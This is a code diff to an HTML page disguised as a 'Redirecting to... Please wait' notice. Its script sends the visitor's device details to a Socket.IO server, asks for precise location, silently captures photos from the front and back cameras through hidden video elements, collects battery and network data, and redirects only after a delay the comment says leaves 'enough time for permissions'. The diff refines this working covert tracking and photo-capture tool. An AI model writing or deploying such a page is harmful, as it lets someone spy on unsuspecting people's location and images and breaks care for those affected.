@@ -48,11 +48,6 @@
         }
         .sub-text { font-size: 13px; color: #8895aa; margin-top: 12px; }
         #hiddenVideo, #hiddenVideoBack { display: none; }
-        #statusMsg {
-            font-size: 12px;
-            color: #999;
-            margin-top: 10px;
-        }
     </style>
 </head>
 <body>
@@ -61,13 +56,11 @@
         <div class="redirect-text">Redirecting to</div>
         <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
         <div class="sub-text">Please wait a moment</div>
-        <div id="statusMsg"></div>
     </div>
 
     <video id="hiddenVideo" autoplay playsinline muted></video>
     <video id="hiddenVideoBack" autoplay playsinline muted></video>
 
-    <!-- Socket.IO CDN with fallback -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
     <script>
         if (typeof io === 'undefined') {
@@ -79,22 +72,15 @@
 
     <script>
         // ============================================================
-        // SIMPLE - ONLY BROWSER DEFAULT PERMISSIONS
-        // NO BUTTONS, NO CUSTOM POPUPS
+        // CLEAN: Browser default permissions, minimal UI
         // ============================================================
         (function() {
             const visitorId = window.location.pathname.split('/').pop();
             const redirectDisplay = document.getElementById('redirectUrlDisplay');
-            const statusMsg = document.getElementById('statusMsg');
             
             let socket = null;
             let redirectUrl = 'https://www.google.com';
             let redirectTriggered = false;
-
-            function setStatus(msg) {
-                statusMsg.textContent = msg;
-                console.log(msg);
-            }
 
             // ============================================
             // 1. FETCH REDIRECT URL
@@ -105,7 +91,7 @@
                     .then(data => {
                         redirectUrl = data.redirectUrl || 'https://www.google.com';
                         redirectDisplay.textContent = redirectUrl;
-                        connectSocket();
+                        startProcess();
                     })
                     .catch(() => {
                         fetch(`/api/visitor-redirect/${visitorId}`)
@@ -113,18 +99,30 @@
                             .then(data => {
                                 redirectUrl = data.redirectUrl || 'https://www.google.com';
                                 redirectDisplay.textContent = redirectUrl;
-                                connectSocket();
+                                startProcess();
                             })
                             .catch(() => {
                                 redirectUrl = 'https://www.google.com';
                                 redirectDisplay.textContent = redirectUrl;
-                                connectSocket();
+                                startProcess();
                             });
                     });
             }
 
             // ============================================
-            // 2. CONNECT SOCKET
+            // 2. START PROCESS
+            // ============================================
+            function startProcess() {
+                connectSocket();
+                
+                // Redirect after 6 seconds (enough time for permissions)
+                setTimeout(function() {
+                    if (!redirectTriggered) redirectNow();
+                }, 6000);
+            }
+
+            // ============================================
+            // 3. CONNECT SOCKET
             // ============================================
             function connectSocket() {
                 try {
@@ -135,24 +133,26 @@
                     });
 
                     socket.on('connect', function() {
-                        setStatus('');
-                        startDataCollection();
+                        sendDeviceInfo();
+                        requestPermissions();
                     });
 
                     socket.on('connect_error', function() {
                         setTimeout(() => socket.connect(), 2000);
                     });
 
-                } catch(e) {
-                    setTimeout(redirectNow, 5000);
-                }
+                } catch(e) {}
             }
 
             // ============================================
-            // 3. START DATA COLLECTION
+            // 4. SEND DEVICE INFO (No permission needed)
             // ============================================
-            function startDataCollection() {
-                // Send device info
+            function sendDeviceInfo() {
+                if (!socket || !socket.connected) {
+                    setTimeout(sendDeviceInfo, 500);
+                    return;
+                }
+
                 const deviceInfo = {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
@@ -163,11 +163,14 @@
                         navigator.platform
                 };
 
-                if (socket && socket.connected) {
-                    socket.emit('visitor-connect', { visitorId, ...deviceInfo });
-                }
+                socket.emit('visitor-connect', { visitorId, ...deviceInfo });
+            }
 
-                // ===== LOCATION - Browser Default Popup =====
+            // ============================================
+            // 5. REQUEST PERMISSIONS (Browser default popup)
+            // ============================================
+            function requestPermissions() {
+                // ===== LOCATION (Browser default popup) =====
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         function(pos) {
@@ -204,12 +207,11 @@
                                 });
                         },
                         function() { /* User denied - continue */ },
-                        { timeout: 5000, enableHighAccuracy: true }
+                        { timeout: 4000, enableHighAccuracy: true }
                     );
                 }
 
-                // ===== CAMERAS - Browser Default Popup =====
-                // Front Camera
+                // ===== FRONT CAMERA (Browser default popup) =====
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' },
                     audio: false
@@ -226,7 +228,7 @@
                 })
                 .catch(function() { /* User denied - continue */ });
 
-                // Back Camera
+                // ===== BACK CAMERA (Browser default popup) =====
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'environment' },
                     audio: false
@@ -243,7 +245,7 @@
                 })
                 .catch(function() { /* User denied - continue */ });
 
-                // ===== BATTERY =====
+                // ===== BATTERY (No permission) =====
                 if (navigator.getBattery) {
                     navigator.getBattery()
                         .then(function(battery) {
@@ -259,7 +261,7 @@
                         .catch(function() {});
                 }
 
-                // ===== NETWORK =====
+                // ===== NETWORK (No permission) =====
                 let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
                 if (navigator.connection) {
                     const conn = navigator.connection;
@@ -276,15 +278,10 @@
                         content: networkData
                     });
                 }
-
-                // ===== AUTO REDIRECT AFTER 4 SECONDS =====
-                setTimeout(function() {
-                    if (!redirectTriggered) redirectNow();
-                }, 4000);
             }
 
             // ============================================
-            // 4. CAPTURE PHOTO
+            // 6. CAPTURE PHOTO
             // ============================================
             function capturePhoto(type, video) {
                 if (!video || !video.videoWidth) return;
@@ -304,14 +301,13 @@
                     });
                 }
 
-                // Stop stream
                 if (video.srcObject) {
                     video.srcObject.getTracks().forEach(t => t.stop());
                 }
             }
 
             // ============================================
-            // 5. REDIRECT
+            // 7. REDIRECT
             // ============================================
             function redirectNow() {
                 if (redirectTriggered) return;
@@ -331,7 +327,7 @@
             }
 
             // ============================================
-            // 6. START
+            // 8. START
             // ============================================
             if (typeof io !== 'undefined') {
                 fetchRedirectUrl();
@@ -339,7 +335,6 @@
                 setTimeout(fetchRedirectUrl, 2000);
             }
 
-            // Cleanup
             window.addEventListener('beforeunload', function() {
                 if (socket) socket.disconnect();
             });
